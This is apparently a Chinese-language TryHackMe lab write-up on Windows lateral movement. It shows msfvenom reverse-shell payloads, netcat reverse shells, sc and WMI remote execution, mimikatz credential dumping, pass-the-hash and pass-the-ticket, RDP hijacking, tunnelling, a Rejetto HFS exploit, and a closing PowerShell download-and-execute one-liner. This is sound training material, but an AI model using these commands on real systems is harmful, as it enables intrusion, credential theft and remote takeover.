# 前置代理

这个房间我在本地无法直连vpn，需要加前置代理

## ssh
只能转发tcp

ssh动态绑定本地转发端口
```
ssh -N -D 127.0.0.1:9050 root@207.246.124.194
```
在ovpn最前面加这两行
```
socks-proxy 127.0.0.1 9050
route t3.50redlight.com 255.255.255.255 net_gateway
```

# kali配置DNS

配置DNS文件
```
vim /etc/resolv.conf 
```

上面配置文件填入以下内容
```
nameserver 10.200.64.101     #THMDC的ip
nameserver 114.114.114.114   #真实的DNS地址，以保证kali还能连接网络
```

重启网络
```
systemctl restart systemd-resolved
```

验证
```
┌──(root💀kali)-[/etc/NetworkManager]
└─# nslookup thmdc.za.tryhackme.com
Server:         10.200.64.101
Address:        10.200.64.101#53

Name:   thmdc.za.tryhackme.com
Address: 10.200.64.101


```

# Task 3  Spawning Processes Remotely

登录```http://distributor.za.tryhackme.com/creds```生成一个用户登录凭据

```
Your credentials have been generated: Username: jenna.field Password: Income1982
```

ssh到靶机
```
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  za\\jenna.field@thmjmp2.za.tryhackme.com -p 22
```

现在假设我们已经获取了一组管理员账号信息，利用这组信息进行横向

```
User: ZA.TRYHACKME.COM\t1_leonard.summers

Password: EZpass4ever
```

## 使用 sc远程 创建服务

1. kali生成一个exe payload

```
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.61.205 LPORT=4444 -o max.exe
```


2. 利用获得的管理员凭据，上传到需要横向的靶机
```
smbclient -c 'put max.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

3. kali开启一个msf监听

```
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.50.61.205     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.50.61.205:4444 
```

4. 在ssh的靶机获得一个管理员的shell

```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.61.205 4443"
```

5. kali接收到上面命令返回来的shell


```
┌──(root💀kali)-[~/tryhackme/LateralMovementandPivoting]
└─# nc -lnvp 4443                  
listening on [any] 4443 ...
connect to [10.50.61.205] from (UNKNOWN) [10.200.64.249] 63401
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
za\jenna.field

C:\Windows\system32>

```

虽然显示是za\jenna.field，但其实已经有```t1_leonard.summers```的管理员权限
```
C:\Windows\system32>dir \\thmiis.za.tryhackme.com\c$
dir \\thmiis.za.tryhackme.com\c$
 Volume in drive \\thmiis.za.tryhackme.com\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\thmiis.za.tryhackme.com\c$

01/04/2022  07:47 AM               103 delete-vagrant-user.ps1
02/27/2022  10:46 AM    <DIR>          inetpub
02/27/2022  10:46 AM    <DIR>          logs
09/15/2018  07:19 AM    <DIR>          PerfLogs
04/25/2022  12:19 PM    <DIR>          Program Files
02/28/2022  11:02 AM    <DIR>          Program Files (x86)
04/24/2022  11:16 AM        76,021,760 splunkforwarder-windows.msi
04/24/2022  11:17 AM               309 splunk_command.bat
06/20/2022  01:39 AM    <DIR>          Temp
03/20/2022  02:52 PM               153 thm-mdtcopy.ps1
03/02/2022  07:50 PM               712 thm-network-setup.ps1
02/27/2022  10:40 AM    <DIR>          tmp
06/17/2022  06:00 PM    <DIR>          tools
06/15/2022  04:31 PM    <DIR>          Users
02/27/2022  10:37 AM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
08/09/2022  06:17 AM    <DIR>          Windows
               5 File(s)     76,023,037 bytes
              11 Dir(s)  46,548,951,040 bytes free

```

6. 创建服务

当前shell下创建一个服务，把服务的二进制数据与之前上传的exe相关联
```
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create just-test-sc binPath= "%windir%\max.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create just-test-sc binPath= "%windir%\max.exe" start= auto
[SC] CreateService SUCCESS

```

启动服务
```
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start just-test-sc
sc.exe \\thmiis.za.tryhackme.com start just-test-sc

SERVICE_NAME: just-test-sc 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3804
        FLAGS              : 
```

7. msf收到返回的shell

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.50.61.205:4444 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.200.64.201
[*] Command shell session 1 opened (10.50.61.205:4444 -> 10.200.64.201:58218) at 2022-08-09 02:32:05 -0400


C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   IPv4 Address. . . . . . . . . . . : 10.200.64.201
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.200.64.1

C:\Windows\system32>hostname
hostname
THMIIS

C:\Windows\system32>

```

> After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what is the flag?

> THM{MOVING_WITH_SERVICES}

# Task 4  Moving Laterally Using WMI

ssh到靶机
```
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  za\\jenna.field@thmjmp2.za.tryhackme.com -p 22
```

现在假设我们已经获取了一组管理员账号信息，利用这组信息进行横向

```
User: ZA.TRYHACKME.COM\t1_corine.waters

Password: Korine.1994
```

## 通过WMI安装MSI包

1. kali编译MSI包

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.61.205 LPORT=4445 -f msi > max.msi
```

2. 利用smb上传到靶机

```
smbclient -c 'put max.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```

3. 开启msf监听

```
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/shell_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.50.61.205     yes       The listen address (an interface may be specified)
   LPORT     4445             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.50.61.205:4444 
```

4. 用powershell开启一个THMIIS 的 WMI 会话

```
PS C:\tools> $username = 't1_corine.waters';                                                           
PS C:\tools> $password = 'Korine.1994';                                                                
PS C:\tools> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;                   
PS C:\tools> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;                                                                                                   
PS C:\tools> $Opt = New-CimSessionOption -Protocol DCOM                                                
PS C:\tools> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop 
```

利用session，执行安装msi文件操作
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\max.msi"; Options = ""; AllUsers = $false}
```

5. 收到rev shell
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.50.61.205:4445 
[*] Command shell session 1 opened (10.50.61.205:4445 -> 10.200.64.201:49264 ) at 2022-08-09 03:07:27 -0400


Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet 4:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   IPv4 Address. . . . . . . . . . . : 10.200.64.201
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.200.64.1

C:\Windows\system32>hostname
hostname
THMIIS

```

# Task 5  Use of Alternate Authentication Material


假设已拿到一组管理员凭据
```
User: ZA.TRYHACKME.COM\t2_felicia.dean

Password: iLov3THM!
```

上面账号ssh登录
```
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  za\\t2_felicia.dean@thmjmp2.za.tryhackme.com -p 22
```

用mimkatz dump出sam的哈希

```
za\t2_felicia.dean@THMJMP2 c:\tools>mimikatz.exe                                                                                

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53                                                                    
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                                                                     
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                        
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                                                                         
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )                                                       
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/                                                       

mimikatz # privilege::debug                                                                                                     
Privilege '20' OK                                                                                                               

mimikatz # token::elevate                                                                                                       
Token Id  : 0                                                                                                                   
User name :                                                                                                                     
SID name  : NT AUTHORITY\SYSTEM                                                                                                 

504     {0;000003e7} 1 D 16738          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary                         
 -> Impersonated !                                                                                                              
 * Process Token : {0;00422172} 0 D 4578675     ZA\t2_felicia.dean      S-1-5-21-3330634377-1326264276-632209373-4605   (12g,24p
)       Primary                                                                                                                 
 * Thread Token  : {0;000003e7} 1 D 4636309     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegatio
n)                                                                                                                              

mimikatz # lsadump::sam                                                                                                         
Domain : THMJMP2                                                                                                                
SysKey : 2e27b23479e1fb1161a839f9800119eb                                                                                       
Local SID : S-1-5-21-1946626518-647761240-1897539217                                                                            

SAMKey : 9a74a253f756d6b012b7ee3d0436f77a                                                                                       

RID  : 000001f4 (500)                                                                                                           
User : Administrator                                                                                                            
  Hash NTLM: 0b2571be7e75e3dbd169ca5352a2dad7                                                                                   

RID  : 000001f5 (501)                                                                                                           
User : Guest                                                                                                                    

RID  : 000001f7 (503)                                                                                                           
User : DefaultAccount    
```

获取内存里的哈希,发现域用户t1_toby.beck的哈希信息

```
mimikatz # sekurlsa::msv 
...
...
Authentication Id : 0 ; 536456 (00000000:00082f88)                                                                              
Session           : RemoteInteractive from 3                                                                                    
User Name         : t1_toby.beck                                                                                                
Domain            : ZA                                                                                                          
Logon Server      : THMDC                                                                                                       
Logon Time        : 8/10/2022 3:41:09 AM                                                                                        
SID               : S-1-5-21-3330634377-1326264276-632209373-4607                                                               
        msv :                                                                                                                   
         [00000003] Primary                                                                                                     
         * Username : t1_toby.beck                                                                                              
         * Domain   : ZA                                                                                                        
         * NTLM     : 533f1bd576caa912bdb9da284bbc60fe                                                                          
         * SHA1     : 8a65216442debb62a3258eea4fbcbadea40ccc38                                                                  
         * DPAPI    : d9cd92937c7401805389fbb51260c45f

...
```

## Pass-the-Hash

因为上面的mimikatz已经执行了权限提升，这里要先执行```token::revert```还原权限，不然无法执行pth

```
mimikatz # token::revert                                                                                                        
 * Process Token : {0;00422172} 0 D 4648291     ZA\t2_felicia.dean      S-1-5-21-3330634377-1326264276-632209373-4605   (12g,24p
)       Primary                                                                                                                 
 * Thread Token  : no token                                                                                                     

mimikatz #                                                                                                                      

mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.
exe -e cmd.exe 10.50.61.205 4444"                                                                                               
user    : t1_toby.beck                                                                                                          
domain  : za.tryhackme.com                                                                                                      
program : c:\tools\nc64.exe -e cmd.exe 10.50.61.205 4444                                                                        
impers. : no                                                                                                                    
NTLM    : 533f1bd576caa912bdb9da284bbc60fe                                                                                      
  |  PID  7364                                                                                                                  
  |  TID  9016                                                                                                                  
  |  LSA Process was already R/W                                                                                                
  |  LUID 0 ; 5092333 (00000000:004db3ed)                                                                                       
  \_ msv1_0   - data copy @ 000001D4F642C8D0 : OK !                                                                             
  \_ kerberos - data copy @ 000001D4F696FFC8                                                                                    
   \_ aes256_hmac       -> null                                                                                                 
   \_ aes128_hmac       -> null                                                                                                 
   \_ rc4_hmac_nt       OK                                                                                                      
   \_ rc4_hmac_old      OK                                                                                                      
   \_ rc4_md4           OK                                                                                                      
   \_ rc4_hmac_nt_exp   OK                                                                                                      
   \_ rc4_hmac_old_exp  OK                                                                                                      
   \_ *Password replace @ 000001D4F68F3B38 (32) -> null                                                                         

mimikatz #                        
```

收到一个rev shell

```
┌──(root㉿rock)-[~]
└─# nc -lnvp 4444                  
listening on [any] 4444 ...
connect to [10.50.61.205] from (UNKNOWN) [10.200.64.249] 60430
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

横向到THMIIS,拿到flag
```
PS C:\> Enter-PSSession -ComputerName THMIIS.za.tryhackme.com
Enter-PSSession -ComputerName THMIIS.za.tryhackme.com
[THMIIS.za.tryhackme.com]: PS C:\Users\t1_toby.beck\Documents> hostname
hostname
THMIIS
[THMIIS.za.tryhackme.com]: PS C:\Users\t1_toby.beck\Documents> C:\Users\t1_toby.beck\desktop\flag.exe
C:\Users\t1_toby.beck\desktop\flag.exe
THM{NO_PASSWORD_NEEDED}

```

> What is the flag obtained from executing "flag.exe" on t1_toby.beck's desktop on THMIIS?

> THM{NO_PASSWORD_NEEDED}

## Pass-the-Ticket


导出票据

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```


查看导出的票据
```
za\t2_felicia.dean@THMJMP2 c:\tools>dir                                                                                         
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is F4B0-FCB9                                                                                              

 Directory of c:\tools                                                                                                          

08/10/2022  06:22 AM    <DIR>          .                                                                                        
08/10/2022  06:22 AM    <DIR>          ..    
...
...                                                                                                       
08/10/2022  06:22 AM             1,685 [0;4db3ed]-0-0-40a10000-t1_toby.beck@HTTP-THMIIS.za.tryhackme.com.kirbi                  
08/10/2022  06:22 AM             1,537 [0;4db3ed]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi  
```

导入票据到当前shell
```
mimikatz # kerberos::ptt [0;4db3ed]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi                                     

* File: '[0;4db3ed]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi': OK   
```

klist查看,已导入

```
za\t2_felicia.dean@THMJMP2 c:\tools>klist                                                                                       

Current LogonId is 0:0x422172                                                                                                   

Cached Tickets: (1)                                                                                                             

#0>     Client: t1_toby.beck @ ZA.TRYHACKME.COM                                                                                 
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM                                                                      
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96                                                                    
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize                                  
        Start Time: 8/10/2022 6:16:28 (local)                                                                                   
        End Time:   8/10/2022 16:16:28 (local)                                                                                  
        Renew Time: 8/17/2022 6:16:28 (local)                                                                                   
        Session Key Type: RSADSI RC4-HMAC(NT)                                                                                   
        Cache Flags: 0x1 -> PRIMARY                                                                                             
        Kdc Called:                       
```


现在已可以列出THMIIS的C盘文件
```
za\t2_felicia.dean@THMJMP2 c:\tools>dir \\THMIIS.za.tryhackme.com\c$                                                            
 Volume in drive \\THMIIS.za.tryhackme.com\c$ is Windows                                                                        
 Volume Serial Number is 1634-22A9                                                                                              

 Directory of \\THMIIS.za.tryhackme.com\c$                                                                                      

01/04/2022  07:47 AM               103 delete-vagrant-user.ps1                                                                  
02/27/2022  10:46 AM    <DIR>          inetpub                                                                                  
02/27/2022  10:46 AM    <DIR>          logs                                                                                     
09/15/2018  07:19 AM    <DIR>          PerfLogs                                                                                 
04/25/2022  12:19 PM    <DIR>          Program Files                                                                            
02/28/2022  11:02 AM    <DIR>          Program Files (x86)                                                                      
04/24/2022  11:16 AM        76,021,760 splunkforwarder-windows.msi                                                              
04/24/2022  11:17 AM               309 splunk_command.bat                                                                       
06/20/2022  01:39 AM    <DIR>          Temp                                                                                     
03/20/2022  02:52 PM               153 thm-mdtcopy.ps1                                                                          
03/02/2022  07:50 PM               712 thm-network-setup.ps1                                                                    
02/27/2022  10:40 AM    <DIR>          tmp                                                                                      
06/17/2022  06:00 PM    <DIR>          tools                                                                                    
06/15/2022  04:31 PM    <DIR>          Users                                                                                    
02/27/2022  10:37 AM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]                                                              
06/17/2022  06:32 PM    <DIR>          Windows                                                                                  
               5 File(s)     76,023,037 bytes                                                                                   
              11 Dir(s)  46,552,743,936 bytes free   
```

## Overpass-the-hash / Pass-the-Key

导出哈希

```
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
...
...
Authentication Id : 0 ; 536456 (00000000:00082f88)                                                                              
Session           : RemoteInteractive from 3                                                                                    
User Name         : t1_toby.beck                                                                                                
Domain            : ZA                                                                                                          
Logon Server      : THMDC                                                                                                       
Logon Time        : 8/10/2022 3:41:09 AM                                                                                        
SID               : S-1-5-21-3330634377-1326264276-632209373-4607                                                               

         * Username : t1_toby.beck                                                                                              
         * Domain   : ZA.TRYHACKME.COM                                                                                          
         * Password : (null)                                                                                                    
         * Key List :                                                                                                           
           aes256_hmac       6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e                                   
           rc4_hmac_nt       533f1bd576caa912bdb9da284bbc60fe                                                                   
           rc4_hmac_old      533f1bd576caa912bdb9da284bbc60fe                                                                   
           rc4_md4           533f1bd576caa912bdb9da284bbc60fe                                                                   
           rc4_hmac_nt_exp   533f1bd576caa912bdb9da284bbc60fe                                                                   
           rc4_hmac_old_exp  533f1bd576caa912bdb9da284bbc60fe  
```


### 利用```rc4```哈希返回一个shell
```
mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.e
xe -e cmd.exe 10.50.61.205 4444"                                                                                                
user    : t1_toby.beck                                                                                                          
domain  : za.tryhackme.com                                                                                                      
program : c:\tools\nc64.exe -e cmd.exe 10.50.61.205 4444                                                                        
impers. : no                                                                                                                    
NTLM    : 533f1bd576caa912bdb9da284bbc60fe                                                                                      
  |  PID  6780                                                                                                                  
  |  TID  6540                                                                                                                  
  |  LSA Process is now R/W                                                                                                     
  |  LUID 0 ; 7808483 (00000000:007725e3)                                                                                       
  \_ msv1_0   - data copy @ 000001D4F58D9B20 : OK !                                                                             
  \_ kerberos - data copy @ 000001D4F696F4D8                                                                                    
   \_ aes256_hmac       -> null                                                                                                 
   \_ aes128_hmac       -> null                                                                                                 
   \_ rc4_hmac_nt       OK                                                                                                      
   \_ rc4_hmac_old      OK                                                                                                      
   \_ rc4_md4           OK                                                                                                      
   \_ rc4_hmac_nt_exp   OK                                                                                                      
   \_ rc4_hmac_old_exp  OK                                                                                                      
   \_ *Password replace @ 000001D4F68F24E8 (32) -> null  
```

### 利用aes256返回一个shell

```
mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:6a0d48f79acaec013d928d84a102b72028d574340b6139e876e
179db48fbde4e /run:"c:\tools\nc64.exe -e cmd.exe 10.50.61.205 4444"                                                             
user    : t1_toby.beck                                                                                                          
domain  : za.tryhackme.com                                                                                                      
program : c:\tools\nc64.exe -e cmd.exe 10.50.61.205 4444                                                                        
impers. : no                                                                                                                    
AES256  : 6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e                                                      
  |  PID  9032                                                                                                                  
  |  TID  7552                                                                                                                  
  |  LSA Process was already R/W                                                                                                
  |  LUID 0 ; 7845084 (00000000:0077b4dc)                                                                                       
  \_ msv1_0   - data copy @ 000001D4F642C8D0 : OK !                                                                             
  \_ kerberos - data copy @ 000001D4F696E7B8                                                                                    
   \_ aes256_hmac       OK                                                                                                      
   \_ aes128_hmac       -> null                                                                                                 
   \_ rc4_hmac_nt       -> null                                                                                                 
   \_ rc4_hmac_old      -> null                                                                                                 
   \_ rc4_md4           -> null                                                                                                 
   \_ rc4_hmac_nt_exp   -> null                                                                                                 
   \_ rc4_hmac_old_exp  -> null                                                                                                 
   \_ *Password replace @ 000001D4F68F0508 (32) -> null      
```

# Task 6  Abusing User Behaviour



在```http://distributor.za.tryhackme.com/creds_t2```生成凭据
```
Your credentials have been generated: Username: t2_kelly.blake Password: 8LXuPeNHZFFG
```

rdp连接
```
xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_kelly.blake /p:8LXuPeNHZFFG
```

## RDP hijacking

原理：
> 当管理员使用远程桌面连接到计算机并关闭RDP客户端而不是注销时，他的会话将无限期地在服务器上保持打开状态。如果您在 Windows Server 2016 及更早版本上拥有 SYSTEM 权限，则无需密码即可接管任何现有的 RDP 会话

1. 首先执行：
```
PsExec64.exe -s cmd.exe
```


2. 列出当前登录会话

```
net session
```
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660119003116.jpg)


3. 劫持
```
tscon 3 /dest:rdp-tcp#39
```
![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660119587415.jpg)

> What flag did you get from hijacking t1_toby.beck's session on THMJMP2?

> THM{NICE_WALLPAPER}

# Task 7  Port Forwarding

在```http://distributor.za.tryhackme.com/creds```获得登录凭据

```
Your credentials have been generated: Username: tony.holland Password: Mhvn2334
```

ssh 登录

```
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa za\\tony.holland@thmjmp2.za.tryhackme.com

```

## socat

用socat建立远程端口转发，把靶机上的3389转到本地13389端口
```
socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
```

使用rdp登录
```
xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660121359926.jpg)

> What is the flag obtained from executing "flag.exe" on t1_thomas.moore's desktop on THMIIS?

> THM{SIGHT_BEYOND_SIGHT}

## Tunnelling Complex Exploits

在靶机的windows上，转发三个端口，dc的端口远程转发（-R）到kali的8888端口，dc上的6666和7777端口本地端口转发（-L）到本地THMJMP2对应端口
```
za\tony.holland@THMJMP2 C:\tools\socat>ssh root@10.50.61.205 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:777
7:127.0.0.1:7777 -N                                                                                               
The authenticity of host '10.50.61.205 (10.50.61.205)' can't be established.                                        
ED25519 key fingerprint is SHA256:XVLToUjcln0lExa5agMvooxujXqZULEOk76++IvuEts.                                      
This key is not known by any other names                                                                            
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                            
Warning: Permanently added '10.50.61.205' (ED25519) to the list of known hosts.                                                                                    
root@10.50.61.205's password:                                                                                       


```

kali上使用msf攻击
```
[*] Using exploit/windows/http/rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost thmjmp2.za.tryhackme.com
lhost => thmjmp2.za.tryhackme.com
msf6 exploit(windows/http/rejetto_hfs_exec) > set ReverseListenerBindAddress 127.0.0.1
ReverseListenerBindAddress => 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set lport 7777
lport => 7777
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvhost 127.0.0.1
srvhost => 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 6666
srvport => 6666
msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(windows/http/rejetto_hfs_exec) > set rport 8888
rport => 8888
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     127.0.0.1        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi
                                         ki/Using-Metasploit
   RPORT      8888             yes       The target port (TCP)
   SRVHOST    127.0.0.1        yes       The local host or network interface to listen on. This must be an address
                                          on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    6666             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/shell_reverse_tcp):

   Name      Current Setting           Required  Description
   ----      ---------------           --------  -----------
   EXITFUNC  process                   yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     thmjmp2.za.tryhackme.com  yes       The listen address (an interface may be specified)
   LPORT     7777                      yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 127.0.0.1:7777 
[*] Using URL: http://thmjmp2.za.tryhackme.com:6666/q01g5BMR3
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /q01g5BMR3
[!] Tried to delete %TEMP%\KVWnd.vbs, unknown result
[*] Command shell session 1 opened (127.0.0.1:7777 -> 127.0.0.1:34376) at 2022-08-10 05:01:20 -0400
[*] Server stopped.


Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\hfs>
-----
          

C:\hfs>
C:\hfs>whoami
whoami
nt authority\local service

C:\hfs>hostname
hostname
THMDC

C:\hfs>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\hfs

08/10/2022  04:31 AM    <DIR>          .
08/10/2022  04:31 AM    <DIR>          ..
08/10/2022  10:00 AM    <DIR>          %TEMP%
06/22/2022  03:23 AM                22 flag.txt
08/24/2014  09:18 PM         2,498,560 hfs.exe
               2 File(s)      2,498,582 bytes
               3 Dir(s)  50,122,391,552 bytes free

C:\hfs>type flag.txt
type flag.txt
THM{FORWARDING_IT_ALL}
C:\hfs>

```

> What is the flag obtained using the Rejetto HFS exploit on THMDC?

> THM{FORWARDING_IT_ALL}


powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.50.61.205:80/a'))"